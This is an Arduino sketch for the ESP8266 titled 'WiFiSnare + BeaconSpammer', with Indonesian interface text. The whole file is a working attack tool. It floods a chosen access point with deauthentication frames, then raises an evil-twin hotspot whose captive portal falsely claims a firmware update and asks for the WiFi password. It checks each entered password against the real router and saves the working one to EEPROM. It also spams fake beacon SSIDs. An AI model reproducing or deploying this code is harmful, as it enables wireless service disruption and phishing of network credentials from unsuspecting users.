/*
 * WiFiSnare + BeaconSpammer + EEPROM Save
 * Branding: GMpro87
 * SSID: GMpro | PASS: Sangkur87
 * Mode: LED Strobo on Success
 */

#include <Arduino.h>
#include <DNSServer.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
}

// ===== CONFIGURATION ===== //
const char *admin_ssid = "GMpro";
const char *admin_pass = "Sangkur87";
const char *branding_title = "GMpro87";

DNSServer dnsServer;
ESP8266WebServer webServer(80);
IPAddress apIP(192, 168, 4, 1);
IPAddress subNetMask(255, 255, 255, 0);

// Global State
bool hotspot_active = false;
bool deauthing_active = false;
bool spammer_active = false;
String tryPassword = "";
String correctPassword = "";
unsigned long last_scan = 0;
unsigned long last_deauth = 0;
unsigned long last_spam = 0;

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t encryption;
} networkDetails;

networkDetails networks[16];
networkDetails selectedNetwork;

// Beacon Spammer Data
const char ssids_spam[] PROGMEM = "GMpro_Free\nGMpro_VIP\nInternet_Gratis\nWiFi_Kenceng\nKena_Prank_Lu\n";
uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
  0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0xe8, 0x03, 
  0x31, 0x00, 0x00, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01
};

uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x07, 0x00};

// --- LED Strobo Logic ---
void stroboLED() {
  for (int i = 0; i < 50; i++) {
    digitalWrite(2, LOW); // On (ESP8266 LED is active low)
    delay(50);
    digitalWrite(2, HIGH); // Off
    delay(50);
  }
}

// --- EEPROM Logic ---
void saveToEEPROM(String data) {
  for (int i = 0; i < data.length(); ++i) EEPROM.write(i, data[i]);
  EEPROM.write(data.length(), '\0');
  EEPROM.commit();
}

String readFromEEPROM() {
  String data = "";
  for (int i = 0; i < 200; ++i) {
    char c = char(EEPROM.read(i));
    if (c == '\0') break;
    data += c;
  }
  return data;
}

// --- Helpers ---
String bytesToStr(const uint8_t* bytes, uint32_t size) {
  String result;
  for (uint32_t i = 0; i < size; ++i) {
    if (i > 0) result += ':';
    if (bytes[i] < 0x10) result += '0';
    result += String(bytes[i], HEX);
  }
  return result;
}

void performScan() {
  int n = WiFi.scanNetworks();
  if (n <= 0) return;
  for (int i = 0; i < min(n, 16); ++i) {
    networks[i].ssid = WiFi.SSID(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    networks[i].ch = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    networks[i].encryption = WiFi.encryptionType(i);
  }
}

// --- UI Header ---
String getHeader(String title) {
  return "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><style>"
         "body{background:#0a0a0a;color:#eee;font-family:sans-serif;text-align:center;margin:0;}"
         ".header{background:linear-gradient(to bottom, #d4af37, #b8860b);color:#000;padding:20px;font-weight:bold;font-size:1.8em;text-shadow: 1px 1px #fff;}"
         "table{width:95%;margin:20px auto;border-collapse:collapse;background:#1a1a1a;font-size:0.9em;}"
         "th,td{padding:10px;border:1px solid #d4af37;}"
         "th{background:#333;color:#d4af37;}"
         ".btn{padding:10px 15px;border:none;border-radius:4px;cursor:pointer;font-weight:bold;margin:5px;display:inline-block;text-decoration:none;}"
         ".btn-gold{background:#d4af37;color:#000;}"
         ".btn-red{background:#8b0000;color:#fff;}"
         ".btn-blue{background:#004a99;color:#fff;}"
         "input{width:85%;padding:12px;margin:10px;border-radius:5px;border:1px solid #d4af37;background:#222;color:#fff;}"
         ".log-box{background:#002200; border:1px dashed #00ff00; padding:15px; margin:20px; color:#00ff00; font-family:monospace;}"
         "</style><title>" + title + "</title></head><body>"
         "<div class='header'>" + branding_title + "</div>";
}

// --- Handlers ---
void handleRoot() {
  if (hotspot_active) {
    if (webServer.hasArg("password")) {
      tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(selectedNetwork.ssid.c_str(), tryPassword.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
      webServer.send(200, "text/html", getHeader("Verifying") + "<h3>Memproses Data...</h3><p>Router sedang melakukan sinkronisasi firmware baru. Mohon tunggu 15 detik.</p><script>setTimeout(()=>window.location.href='/result',15000);</script></body></html>");
    } else {
      String p = getHeader(selectedNetwork.ssid);
      p += "<div style='padding:20px;'><h3>Verifikasi Diperlukan</h3><p>Pembaruan sistem otomatis terhenti. Masukkan kata sandi WiFi untuk melanjutkan instalasi firmware.</p>"
           "<form method='POST'><input type='password' name='password' placeholder='WiFi Password' required><br>"
           "<input type='submit' class='btn btn-gold' value='Update Sekarang'></form></div></body></html>";
      webServer.send(200, "text/html", p);
    }
    return;
  }

  // Admin Panel Commands
  if (webServer.hasArg("ap")) {
    String b = webServer.arg("ap");
    for(int i=0; i<16; i++) if(bytesToStr(networks[i].bssid,6)==b) selectedNetwork = networks[i];
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
  if (webServer.hasArg("spam")) spammer_active = (webServer.arg("spam") == "1");
  if (webServer.hasArg("clear")) { saveToEEPROM(""); correctPassword = ""; }
  if (webServer.hasArg("evil")) {
    hotspot_active = (webServer.arg("evil") == "1");
    dnsServer.stop(); WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP, subNetMask);
    if(hotspot_active) WiFi.softAP(selectedNetwork.ssid.c_str());
    else WiFi.softAP(admin_ssid, admin_pass);
    dnsServer.start(53, "*", apIP);
  }

  String p = getHeader("Admin Panel");
  p += "<table><tr><th>SSID</th><th>RSSI</th><th>Aksi</th></tr>";
  for (int i=0; i<16 && networks[i].ssid!=""; i++) {
    bool isS = (bytesToStr(networks[i].bssid,6) == bytesToStr(selectedNetwork.bssid,6));
    p += "<tr><td>"+networks[i].ssid+"</td><td>"+String(networks[i].rssi)+"</td>"
         "<td><a href='/?ap="+bytesToStr(networks[i].bssid,6)+"' class='btn "+(isS?"btn-gold":"btn-blue")+"'>"+(isS?"✓":"Pilih")+"</a></td></tr>";
  }
  p += "</table><div style='padding:10px;'>";
  p += "<a href='/?deauth="+(String)(deauthing_active?"0":"1")+"' class='btn "+(deauthing_active?"btn-red":"btn-gold")+"'>Deauth: "+(deauthing_active?"ON":"OFF")+"</a>";
  p += "<a href='/?evil="+(String)(hotspot_active?"0":"1")+"' class='btn "+(hotspot_active?"btn-red":"btn-gold")+"'>EvilTwin: "+(hotspot_active?"ON":"OFF")+"</a>";
  p += "<a href='/?spam="+(String)(spammer_active?"0":"1")+"' class='btn "+(spammer_active?"btn-red":"btn-gold")+"'>Spammer: "+(spammer_active?"ON":"OFF")+"</a>";
  p += "</div>";
  
  if(correctPassword != "") {
    p += "<div class='log-box'><strong>LOG HASIL:</strong><br>"+correctPassword+"<br><br><a href='/?clear=1' style='color:red'>Hapus Log</a></div>";
  }
  
  p += "</body></html>";
  webServer.send(200, "text/html", p);
}

void handleResult() {
  if (WiFi.status() == WL_CONNECTED) {
    String res = "SSID: " + selectedNetwork.ssid + " | PASS: " + tryPassword;
    correctPassword = res;
    saveToEEPROM(res); // Simpan permanen
    
    // Trigger Strobo LED Kemenangan
    stroboLED();
    
    hotspot_active = false; deauthing_active = false;
    WiFi.softAPdisconnect(true); WiFi.softAP(admin_ssid, admin_pass);
    webServer.send(200, "text/html", getHeader("Success") + "<h3>Update Berhasil!</h3><p>Router akan restart.</p></body></html>");
  } else {
    webServer.send(200, "text/html", getHeader("Error") + "<h3>Password Salah</h3><p>Mengalihkan kembali...</p><script>setTimeout(()=>window.location.href='/',3000);</script></body></html>");
  }
}

// --- Setup ---
void setup() {
  EEPROM.begin(512);
  correctPassword = readFromEEPROM(); // Load password lama jika ada
  
  pinMode(2, OUTPUT);
  digitalWrite(2, HIGH); // Off initial state
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subNetMask);
  WiFi.softAP(admin_ssid, admin_pass);
  
  dnsServer.start(53, "*", apIP);
  webServer.on("/", handleRoot);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleRoot);
  webServer.begin();
  performScan();
}

// --- Loop Logic ---
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  unsigned long now = millis();

  // 1. Logic Deauth (Hanya jika target dipilih dan aktif)
  if (deauthing_active && now - last_deauth > 1000) {
    wifi_set_channel(selectedNetwork.ch);
    memcpy(&deauthPacket[10], selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], selectedNetwork.bssid, 6);
    deauthPacket[0] = 0xC0; wifi_send_pkt_freedom(deauthPacket, 26, 0);
    deauthPacket[0] = 0xA0; wifi_send_pkt_freedom(deauthPacket, 26, 0);
    last_deauth = now;
  }

  // 2. Logic Beacon Spammer
  if (spammer_active && now - last_spam > 100) {
    static int spam_ptr = 0;
    int j = 0; char tmp;
    while (true) {
      tmp = pgm_read_byte(ssids_spam + spam_ptr + j);
      if (tmp == '\n' || tmp == '\0' || j > 31) break;
      j++;
    }
    uint8_t mac[6] = {0x00, 0x01, 0x02, 0x03, 0x04, (uint8_t)random(255)};
    memcpy(&beaconPacket[10], mac, 6); memcpy(&beaconPacket[16], mac, 6);
    memset(&beaconPacket[38], 0x20, 32); memcpy_P(&beaconPacket[38], &ssids_spam[spam_ptr], j);
    beaconPacket[37] = j;
    wifi_set_channel(random(1, 12));
    wifi_send_pkt_freedom(beaconPacket, 109, 0);
    spam_ptr += j + 1;
    if (spam_ptr >= strlen_P(ssids_spam)) spam_ptr = 0;
    last_spam = now;
  }

  // 3. Auto Scan berkala
  if (now - last_scan > 30000 && !hotspot_active) { 
    performScan(); 
    last_scan = now; 
  }
}
